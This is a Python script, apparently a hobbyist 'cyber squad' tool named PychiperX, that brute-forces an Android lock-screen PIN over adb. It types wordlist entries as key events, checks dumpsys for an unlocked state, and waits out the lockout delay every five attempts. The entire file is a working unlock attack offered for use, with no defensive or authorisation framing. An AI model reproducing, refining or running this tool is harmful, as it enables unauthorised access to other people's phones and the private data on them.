import subprocess
import time
import random
from colorama import Fore, Style, init

# Initialize colorama
init()

a  = '''
Website  : https://cybersquad6351.netlify.app/
youTube  : https://youtube.com/@cyber_squad6351?si=8Lm-a76txyExM5F_
Insta    : https://www.instagram.com/cyber__squad6351/
Email Id : mishraaditya.skm14@gmail.com | cybersquad.3491@gmail.com
'''
print("PychiperX  Desined By @Cyber_Squad6351")
print(a)

def swipe_up():
    """Swipes up on the phone screen."""
    try:
        subprocess.check_output(["adb", "shell", "input", "swipe", "500", "1000", "500", "500"])
        print(Fore.GREEN + "Swipe up executed successfully." + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + "Error swiping up:" + Style.RESET_ALL, e)

def type_password(password):
    """Types a password on the lock screen."""
    try:
        for digit in password:
            subprocess.check_output(["adb", "shell", "input", "keyevent", f"KEYCODE_{digit}"])
            time.sleep(0.2)  # Delay between key presses
        print(Fore.GREEN + f"Trying... : {password}" + Style.RESET_ALL)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + "Error typing password:" + Style.RESET_ALL, e)

def is_device_unlocked():
    """Checks if the device is unlocked by trying to access the home screen."""
    try:
        output = subprocess.check_output(["adb", "shell", "dumpsys", "window", "policy"]).decode()
        if "mShowingLockscreen=false" in output:
            return True
    except subprocess.CalledProcessError:
        pass
    return False

def get_user_inputs():
    """Gets user inputs from the terminal."""
    wordlist_path = input("Enter the file path of the wordlist: ")
    max_attempts = int(input("Enter the number of attempts before stopping: "))
    delay_time = int(input("Enter the delay time (seconds) between attempts: "))
    return wordlist_path, max_attempts, delay_time

def unlock_process(wordlist_path, max_attempts, delay_time):
    """Handles the unlocking process with retry mechanism."""
    attempt_count = 0
    
    try:
        with open(wordlist_path, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "Error: Wordlist file not found." + Style.RESET_ALL)
        return
    
    while attempt_count < max_attempts:
        if is_device_unlocked():
            print(Fore.GREEN + "Your Device IS Unlocked" + Style.RESET_ALL)
            return
        
        for password in passwords:
            if is_device_unlocked():
                print(Fore.GREEN + "Your Device IS Unlocked" + Style.RESET_ALL)
                return
            
            if attempt_count >= max_attempts:
                print(Fore.RED + "Maximum attempts reached. Stopping." + Style.RESET_ALL)
                return
            
            type_password(password)
            print(Fore.GREEN + f"Waiting for {delay_time} seconds before next attempt..." + Style.RESET_ALL, end="", flush=True)
            for remaining in range(delay_time, 0, -1):
                print(Fore.GREEN + f" {remaining}s " + Style.RESET_ALL, end="", flush=True)
                time.sleep(1)
            print()  # Move to a new line after countdown
            
            attempt_count += 1
            
            if is_device_unlocked():
                print(Fore.GREEN + "Your Device IS Unlocked" + Style.RESET_ALL)
                return
            
            if attempt_count % 5 == 0:
                print(Fore.GREEN + "Reached 5 attempts. Waiting for 30 seconds..." + Style.RESET_ALL)
                for remaining in range(30, 0, -1):
                    print(Fore.GREEN + f" {remaining}s " + Style.RESET_ALL, end="", flush=True)
                    time.sleep(1)
                print()  # Move to a new line after countdown
                print(Fore.GREEN + "Restarting the unlocking process..." + Style.RESET_ALL)
                swipe_up()
    
    print(Fore.RED + "Device was not unlocked within the given attempts." + Style.RESET_ALL)
    print(Fore.RED + "Process completed." + Style.RESET_ALL)

if __name__ == "__main__":
    try:
        devices = subprocess.check_output(["adb", "devices"]).decode()
        if "device" not in devices:
            print(Fore.RED + "No device detected. Make sure your device is connected and authorized." + Style.RESET_ALL)
            exit()
        
        print(Fore.GREEN + "Device detected. Starting the unlocking process..." + Style.RESET_ALL)
        swipe_up()
        wordlist_path, max_attempts, delay_time = get_user_inputs()
        unlock_process(wordlist_path, max_attempts, delay_time)
    except Exception as e:
        print(Fore.RED + "An error occurred:" + Style.RESET_ALL, e)
